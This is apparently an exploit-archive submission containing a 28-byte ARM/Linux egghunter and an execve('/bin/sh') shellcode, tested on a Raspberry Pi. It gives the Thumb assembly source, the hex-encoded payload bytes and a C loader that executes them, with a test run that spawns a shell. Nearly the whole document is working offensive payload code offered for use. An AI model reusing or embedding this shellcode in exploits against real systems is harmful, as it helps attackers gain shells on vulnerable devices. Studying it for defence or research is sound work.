/*
# Title:  Linux/ARM - Egghunter (PWN!) + execve("/bin/sh", NULL, NULL) Shellcode (28 Bytes)
# Date:   2018-09-24
# Tested: armv7l (Raspberry Pi 3 Model B+)
# Author: Ken Kitahara

[System Information]
pi@raspberrypi:~ $ uname -a
Linux raspberrypi 4.14.52-v7+ #1123 SMP Wed Jun 27 17:35:49 BST 2018 armv7l GNU/Linux
pi@raspberrypi:~ $ lsb_release -a
No LSB modules are available.
Distributor ID:	Raspbian
Description:	Raspbian GNU/Linux 9.4 (stretch)
Release:	9.4
Codename:	stretch
pi@raspberrypi:~ $


[Procedure]
(1) Create main shellcode in THUMB state. This PoC's example is execve("/bin/sh", NULL, NULL) shellcode. (20 Bytes)
pi@raspberrypi:~ $ cat shell.s
.section .text
.global _start

_start:
    .THUMB
    // execve("/bin/sh", NULL, NULL)
    adr  r0, spawn
    eor  r1, r1, r1
    eor  r2, r2, r2
    strb r2, [r0, #endline-spawn-1]
    mov  r7, #11
    svc  #1

spawn:
.ascii "/bin/shX"
endline:
pi@raspberrypi:~ $ as -o shell.o shell.s && ld -N -o shell shell.o
pi@raspberrypi:~ $ objcopy -O binary shell shell.bin
pi@raspberrypi:~ $ hexdump -v -e '"\\""x" 1/1 "%02x" ""' shell.bin && echo
\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x58
pi@raspberrypi:~ $

(2-a) If your main shellcode is in higher address, use following egghunter. (28 Bytes)
pi@raspberrypi:~ $ cat egghunter-high.s
.section .text
.global _start

_start:
    .ARM
    add lr, pc, #1
    bx  lr

    .THUMB
    adr r1, startpoint
    ldr r2, egg

    next_addr:
    add r1, r1, #1
    ldr r3, [r1]
    cmp r2, r3
    bne next_addr
    add r1, r1, #4
    mov pc, r1

egg:
.ascii "PWN!"
startpoint:
pi@raspberrypi:~ $ as -o egghunter-high.o egghunter-high.s && ld -N -o egghunter-high egghunter-high.o
pi@raspberrypi:~ $ objcopy -O binary egghunter-high egghunter-high.bin
pi@raspberrypi:~ $ hexdump -v -e '"\\""x" 1/1 "%02x" ""' egghunter-high.bin && echo
\x01\xe0\x8f\xe2\x1e\xff\x2f\xe1\x04\xa1\x03\x4a\x01\x31\x0b\x68\x9a\x42\xfb\xd1\x04\x31\x8f\x46\x50\x57\x4e\x21
pi@raspberrypi:~ $

(2-b) If your main shellcode is in lower address, use following egghunter. (28 Bytes)
pi@raspberrypi:~ $ cat egghunter-low.s
.section .text
.global _start

_start:
    .ARM
    add lr, pc, #1
    bx  lr

    .THUMB
    adr r1, startpoint
    ldr r2, egg

    next_addr:
    sub r1, r1, #1
    ldr r3, [r1]
    cmp r2, r3
    bne next_addr
    startpoint:
    add r1, r1, #4
    mov pc, r1

egg:
.ascii "PWN!"
pi@raspberrypi:~ $ as -o egghunter-low.o egghunter-low.s && ld -N -o egghunter-low egghunter-low.o
pi@raspberrypi:~ $ objcopy -O binary egghunter-low egghunter-low.binpi@raspberrypi:~ $ hexdump -v -e '"\\""x" 1/1 "%02x" ""' egghunter-low.bin && echo
\x01\xe0\x8f\xe2\x1e\xff\x2f\xe1\x02\xa1\x03\x4a\x01\x39\x0b\x68\x9a\x42\xfb\xd1\x04\x31\x8f\x46\x50\x57\x4e\x21
pi@raspberrypi:~ $


[Operation Test]
pi@raspberrypi:~ $ gcc -fno-stack-protector -z execstack -o loader loader.c
pi@raspberrypi:~ $ ./loader
Egghunting Shellcode Length: 28
Shellcode Length: 24
$ id
uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),997(gpio),998(i2c),999(spi)
$ exit
pi@raspberrypi:~ $


*/

#include<stdio.h>
#include<string.h>

// Egghunting Shellcode for higher address (28 Bytes)
unsigned char sc[] = \
"\x01\xe0\x8f\xe2\x1e\xff\x2f\xe1"
"\x04\xa1\x03\x4a\x01\x31\x0b\x68"
"\x9a\x42\xfb\xd1\x04\x31\x8f\x46"
"\x50\x57\x4e\x21";

unsigned char shell[] = \
// Egg Tag (4 Bytes)
"PWN!"
// execve("/bin/sh", NULL, NULL) Shellcode (20 Bytes)
"\x02\xa0\x49\x40\x52\x40\xc2\x71"
"\x0b\x27\x01\xdf\x2f\x62\x69\x6e"
"\x2f\x73\x68\x58";

/*
// Egghunting Shellcode for lower address (28 Bytes)
unsigned char sc[] = \
"\x01\xe0\x8f\xe2\x1e\xff\x2f\xe1"
"\x02\xa1\x03\x4a\x01\x39\x0b\x68"
"\x9a\x42\xfb\xd1\x04\x31\x8f\x46"
"\x50\x57\x4e\x21";
*/

void main()
{
    printf("Egghunting Shellcode Length: %d\n", strlen(sc));
    printf("Shellcode Length: %d\n", strlen(shell));

    int (*ret)() = (int(*)())sc;

    ret();
}